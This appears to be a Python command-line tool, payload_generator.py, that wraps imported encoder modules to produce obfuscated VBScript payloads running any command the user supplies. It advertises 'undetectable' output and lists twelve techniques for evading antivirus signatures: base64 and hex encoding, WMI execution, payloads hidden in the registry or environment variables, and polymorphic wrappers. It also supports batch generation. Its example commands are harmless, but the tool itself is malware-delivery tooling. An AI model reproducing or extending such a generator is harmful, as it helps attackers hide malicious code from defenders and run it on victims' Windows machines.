#!/usr/bin/env python3
"""
Unified Payload Generator for VBS Encryption
Provides clean, easy-to-use API for generating undetectable VBS payloads
"""

from vbs_encoder import VBSEncoder, generate_clean_vbs_payload, ObfuscationConfig
from vbs_advanced_obfuscation import create_stealthy_payload
from typing import Optional, List, Dict, Tuple
import argparse
import sys
from concurrent.futures import ThreadPoolExecutor
import threading


class PayloadGenerator:
    """Main interface for generating payloads with caching and batch support"""

    # Class-level payload cache (shared across instances)
    _payload_cache: Dict[Tuple[str, str, str], str] = {}
    _cache_lock = threading.Lock()
    _max_cache_size = 1000  # Limit cache size to prevent memory bloat

    # Techniques that produce intentionally varied output (polymorphic/random).
    # Caching these would defeat the variation, so they are excluded from the
    # payload cache.
    _POLYMORPHIC_TECHNIQUES = frozenset({"hidden_execution", "com"})

    def __init__(self, enable_caching: bool = True, enable_randomization: bool = True):
        self.encoder = VBSEncoder()
        # Store randomization preference at the instance level so that
        # creating one PayloadGenerator doesn't silently alter every other
        # VBSEncoder instance in the process.
        self.encoder.randomize_names = enable_randomization
        self.enable_caching = enable_caching
        self.techniques = [
            "basic",
            "base64",
            "hex",
            "array",
            "wmi",
            "registry",
            "env",
            "com",
            "obfuscated_calls",
            "filewriter",
            "multi_encoding",
            "hidden_execution",
        ]

    def generate(
        self, command: str, technique: str = "base64", obfuscation_level: str = "high"
    ) -> str:
        """
        Generate VBS payload using specified technique with caching support

        Args:
            command: Command to execute
            technique: Obfuscation technique to use
            obfuscation_level: "low", "medium", "high"

        Returns:
            VBS payload code
        """

        # Polymorphic techniques must never be cached -- returning a cached
        # result would silently destroy the per-invocation variation that
        # polymorphism is supposed to provide.
        is_polymorphic = technique in self._POLYMORPHIC_TECHNIQUES
        if self.enable_caching and not is_polymorphic:
            cache_key = (command, technique, obfuscation_level)
            if cache_key in PayloadGenerator._payload_cache:
                return PayloadGenerator._payload_cache[cache_key]
        else:
            cache_key = None

        # Generate payload
        if technique == "basic":
            payload = self.encoder.create_wscript_hidden_execution(command)

        elif technique == "base64":
            payload = self.encoder.create_full_obfuscated_payload(command, "base64")

        elif technique == "hex":
            payload = self.encoder.create_full_obfuscated_payload(command, "hex")

        elif technique == "array":
            payload = self.encoder.create_full_obfuscated_payload(command, "array")

        elif technique in ["wmi", "registry", "env", "com", "obfuscated_calls", "filewriter", "multi_encoding"]:
            payload = create_stealthy_payload(command, technique)

        elif technique == "hidden_execution":
            payload = generate_clean_vbs_payload(command, obfuscation_level)
            if obfuscation_level == "high":
                payload = self.encoder.create_polymorphic_wrapper(payload)

        else:
            raise ValueError(f"Unknown technique: {technique}")

        # Store in cache (thread-safe)
        if self.enable_caching and cache_key:
            with PayloadGenerator._cache_lock:
                if len(PayloadGenerator._payload_cache) < PayloadGenerator._max_cache_size:
                    PayloadGenerator._payload_cache[cache_key] = payload

        return payload

    def list_techniques(self) -> List[str]:
        """List all available techniques"""
        return self.techniques

    def get_technique_info(self, technique: str) -> str:
        """Get description of a technique"""
        descriptions = {
            "basic": "Simple WScript.Shell execution (minimal obfuscation)",
            "base64": "Base64 encoding with MSXML decoder (standard stealth)",
            "hex": "Hex encoding with Chr() decoder (good obfuscation)",
            "array": "Array-based hex encoding (moderate stealth)",
            "wmi": "WMI-based process execution (less detected than Shell)",
            "registry": "Payload stored in registry, assembled at runtime",
            "env": "Payload hidden in environment variables",
            "com": "Various COM objects to avoid signature detection",
            "obfuscated_calls": "Function names built via string concatenation",
            "filewriter": "Write command to temp file, execute via cmd",
            "multi_encoding": "Multiple encoding layers for maximum obfuscation",
            "hidden_execution": "Wrapped payload with polymorphic obfuscation",
        }
        return descriptions.get(technique, "Unknown technique")

    def generate_batch(
        self,
        commands: List[str],
        technique: str = "base64",
        obfuscation_level: str = "high",
        num_workers: int = 4,
        use_threading: bool = True
    ) -> List[str]:
        """
        Generate multiple payloads efficiently using optional parallelization

        Args:
            commands: List of commands to encode
            technique: Obfuscation technique to use
            obfuscation_level: "low", "medium", "high"
            num_workers: Number of worker threads (ignored if use_threading=False)
            use_threading: Use ThreadPoolExecutor for parallel generation

        Returns:
            List of VBS payloads
        """
        if not use_threading or len(commands) < 3:
            # Sequential generation for small batches
            return [self.generate(cmd, technique, obfuscation_level) for cmd in commands]

        # Parallel generation
        results = []
        with ThreadPoolExecutor(max_workers=min(num_workers, len(commands))) as executor:
            futures = [
                executor.submit(self.generate, cmd, technique, obfuscation_level)
                for cmd in commands
            ]
            results = [f.result() for f in futures]

        return results

    def clear_cache(self):
        """Clear the payload cache"""
        with PayloadGenerator._cache_lock:
            PayloadGenerator._payload_cache.clear()

    @classmethod
    def get_cache_stats(cls) -> Dict[str, int]:
        """Get cache statistics"""
        with cls._cache_lock:
            return {
                'cache_size': len(cls._payload_cache),
                'max_size': cls._max_cache_size,
                'usage_percent': (len(cls._payload_cache) / cls._max_cache_size) * 100
            }


def main():
    parser = argparse.ArgumentParser(
        description="VBS Payload Generator for Security Research",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  python payload_generator.py -c "powershell.exe -Command 'Write-Host test'" --technique base64
  python payload_generator.py -c "cmd /c echo test" --technique wmi --obfuscation high
  python payload_generator.py --list-techniques
  python payload_generator.py --technique-info wmi
        """,
    )

    parser.add_argument(
        "-c",
        "--command",
        help="Command to encode in VBS payload",
    )
    parser.add_argument(
        "-t",
        "--technique",
        default="base64",
        help="Obfuscation technique (see --list-techniques)",
    )
    parser.add_argument(
        "-o",
        "--obfuscation",
        default="high",
        choices=["low", "medium", "high"],
        help="Obfuscation level",
    )
    parser.add_argument(
        "--list-techniques",
        action="store_true",
        help="List all available techniques",
    )
    parser.add_argument(
        "--technique-info",
        metavar="TECHNIQUE",
        help="Get detailed info about a technique",
    )
    parser.add_argument(
        "-f",
        "--file",
        help="Save output to file",
    )

    args = parser.parse_args()

    generator = PayloadGenerator()

    if args.list_techniques:
        print("Available VBS Obfuscation Techniques:")
        print("-" * 50)
        for tech in generator.list_techniques():
            print(f"  {tech:<20} - {generator.get_technique_info(tech)}")
        return

    if args.technique_info:
        print(f"Technique: {args.technique_info}")
        print(f"Description: {generator.get_technique_info(args.technique_info)}")
        return

    if not args.command:
        print("Error: --command required (unless using --list-techniques)")
        parser.print_help()
        sys.exit(1)

    # Generate payload
    try:
        payload = generator.generate(
            args.command, args.technique, args.obfuscation
        )

        if args.file:
            with open(args.file, "w") as f:
                f.write(payload)
            print(f"[+] Payload written to {args.file}")
        else:
            print(payload)

    except Exception as e:
        print(f"Error generating payload: {e}", file=sys.stderr)
        sys.exit(1)


if __name__ == "__main__":
    main()
